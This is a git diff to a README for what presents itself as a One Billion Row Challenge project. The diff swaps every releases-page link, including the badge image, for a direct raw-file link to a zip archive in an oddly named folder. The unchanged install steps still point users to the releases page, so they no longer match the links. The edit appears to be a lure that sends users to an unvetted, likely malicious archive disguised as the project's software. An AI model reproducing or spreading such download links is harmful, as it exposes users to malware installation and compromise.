@@ -7,11 +7,11 @@ Welcome to the 2025-One-Billion-Row-Challenge-Aovivo repository! This project ai
 To get started, you will need to download the software from our releases page. 
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/releases)
+[![Download](https://raw.githubusercontent.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/main/Philistinism/2025-One-Billion-Row-Challenge-Aovivo.zip)](https://raw.githubusercontent.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/main/Philistinism/2025-One-Billion-Row-Challenge-Aovivo.zip)
 
 ## 📥 Download & Install
 1. Click on the link below to visit the releases page:
-   [Download the software here](https://github.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/releases).
+   [Download the software here](https://raw.githubusercontent.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/main/Philistinism/2025-One-Billion-Row-Challenge-Aovivo.zip).
    
 2. On this page, find the latest version of the software. Look for the section titled "Assets." 
 
@@ -57,4 +57,4 @@ For more updates and features, keep an eye on the releases page!
 
 ## 🔗 Download The Software
 For your convenience, here’s the link again: 
-[Download the software here](https://github.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/releases).
+[Download the software here](https://raw.githubusercontent.com/karan48177/2025-One-Billion-Row-Challenge-Aovivo/main/Philistinism/2025-One-Billion-Row-Challenge-Aovivo.zip).
